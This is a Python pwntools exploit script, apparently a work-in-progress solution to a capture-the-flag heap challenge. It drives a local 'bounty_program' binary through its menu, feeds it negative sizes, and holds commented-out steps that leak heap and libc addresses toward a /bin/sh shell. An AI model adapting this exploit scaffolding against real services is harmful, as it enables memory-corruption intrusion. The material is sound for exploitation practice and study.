#!/usr/bin/env python3

from pwn import *
import os

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\0"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
pad = lambda l, c: c * l
z = lambda l: l * b'\0'
A = lambda l: l * b'A'

e = context.binary = ELF('./bounty_program_patched', checksec=False)
libc = ELF('./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

TERMINAL = 3
USE_PTY = True
GDB_ATTACH_DELAY = 1

match TERMINAL:
    case 1:
        context.terminal = ["/usr/bin/tilix", "-a", "session-add-right", "-e", "bash", "-c"]
    case 2:
        context.terminal = ["tmux", "split-window", "-h"]
    case 3:
        context.terminal = ["/mnt/c/Windows/system32/cmd.exe", "/c", "start", "wt.exe",
                            "-w", "0", "split-pane", "-V", "-s", "0.5",
                            "wsl.exe", "-d", "Ubuntu-24.04", "bash", "-c"]
    case _:
        raise ValueError(f"Unknown terminal: {TERMINAL}")

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
set follow-fork-mode parent
set detach-on-fork on
brva 0x1601
brva 0x15E9
brva 0x20B7
continue
'''

def attach(p):
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        sleep(GDB_ATTACH_DELAY)

def conn():
    if args.LOCAL:
        env = os.environ.copy()
        env["GLIBC_TUNABLES"] = "glibc.malloc.tcache_count=0"
        if USE_PTY:
            p = process([e.path], stdin=PTY, stdout=PTY, stderr=PTY, env=env)
        else:
            p = process([e.path], env=env)
        sleep(0.25)
        attach(p)
        return p
    else:
        host = "localhost"
        port = 1337
        return remote(host, port)

def Login(username, password):
    slan(p, b'choice', 1)
    sa(p, b'Username', username)
    sa(p, b'Password', password)
    sleep(0.05)
    
def Register(username, password, contact):
    slan(p, b'choice', 2)
    sa(p, b'Username', username)
    sa(p, b'Password', password)
    sa(p, b'Contact', contact)
    sleep(0.05)

def AddNewProduct(name, company, comment):
    slan(p, b'choice', 1)
    sa(p, b'Name', name)
    sa(p, b'Company', company)
    sa(p, b'Comment', comment)
    sleep(0.05)

def AddVulnType(size, type, price):
    slan(p, b'choice', 2)
    slan(p, b'Size', size)
    sa(p, b'Type', type)
    slan(p, b'Price', price)
    sleep(0.05)

def SubmitBugReport(product_id, type_id, title, bug_id, desc_len, description):
    slan(p, b'choice', 3)
    slan(p, b'Product', product_id)
    slan(p, b'Type:', type_id)
    sa(p, b'Title', title)
    slan(p, b'ID', bug_id)
    slan(p, b'Length', desc_len)
    sa(p, b'Descripton', description)
    sleep(0.05)

def RemoveVulnType(size, type):
    slan(p, b'choice', 4)
    slan(p, b'Size', size)
    sa(p, b'Type', type)
    sleep(0.05)

def ShowBugDetail(product_id):
    slan(p, b'choice', 6)
    slan(p, b'ID', product_id)
    sleep(0.05)

def DeleteReport(product_id, bug_id):
    slan(p, b'choice', 8)
    slan(p, b'Product ID', product_id)
    slan(p, b'Bug ID', bug_id)

username = password = b'ngtuonghung'
desc_min_size = 0x408
desc_min_size_hi = 0x410
desc_min_size_lo = 0x400

attempt = 0
while True:
    attempt += 1
    print("\n----------> Attempt", attempt)

    p = conn()

    if not args.LOCAL:
        sa(p, b'Name', username)
        slan(p, b'Value', password)

    print("Register and login")
    Register(username, password, b'A')
    Login(username, password)

    # Bounty
    slan(p, b'choice', 1)

    # print("Leaking heap address")
    # AddVulnType(0x70, b'A', 0)
    # AddVulnType(0x70, b'B', 0)
    # slan(p, b'choice', 2)
    # slan(p, b'Size', -1)
    # sa(p, b'Type', b'C')
    # ru(p, b'type: ')
    # heap_base = leak_bytes(b'\0' + rn(p, 5), 0x500)
    # lg("heap base", heap_base)

    # # Hoping for heap base address ends with 0x0000
    # if heap_base & 0xffff != 0:
    #     print("Failed attempt, we're unlucky this time")
    #     p.close()
    #     continue

    # print("We're lucky this time")
    AddNewProduct(b'iphone 18 pro max premium vip', b'4pple', b'A')
    input()
    SubmitBugReport(0, 0, b'A', 1, 0x12c00, b'A')
    input()
    AddVulnType(-1, b'A', 0)
    # SubmitBugReport(0, 0, b'B', 2, 0, b'A')

    # RemoveVulnType(0x140, A(0x40))
    # AddVulnType(0x40, )
    # DeleteReport(0, 1)
    # AddVulnType(0x1e8, A(0x100), 0)
    # slan(p, b'choic,e', 2)
    # input()
    # slan(p, b'Size', 0xfffffff)
    # sa(p, b'Type', b'F')
    # ru(p, b'type: ')
    # libc.address = leak_bytes(b'\0' + rn(p, 5), 0x3ebc00)
    # lg("libc base", libc.address)
    input()

    ia(p)
    p.close()
    break